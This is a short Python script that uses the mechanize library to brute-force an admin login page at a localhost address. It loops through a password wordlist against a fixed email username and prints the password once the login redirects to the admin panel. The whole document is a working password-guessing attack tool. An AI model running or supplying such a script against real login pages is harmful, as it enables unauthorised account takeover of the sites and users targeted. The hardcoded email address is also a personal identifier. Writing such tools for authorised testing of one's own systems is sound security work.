#!/usr/bin/python3
import mechanize


b = mechanize.Browser()
url = "http://127.0.0.1:8000/admin/login/"
wordlist = "/root/WordList/wordlist.txt"

try:
    wordlist = open(wordlist, 'r')
except:
    print("\nWordlist Not Found!")
    quit()


for password in wordlist:
    response = b.open(url)
    b.select_form(nr=0)

    b.form['username'] = 'me.jaki@outlook.com'
    b.form['password'] = password.strip()

    b.method = "POST"
    r = b.submit()

    if r.geturl() == "http://127.0.0.1:8000/admin/":
        print("Password Found: " + password.strip())
        break
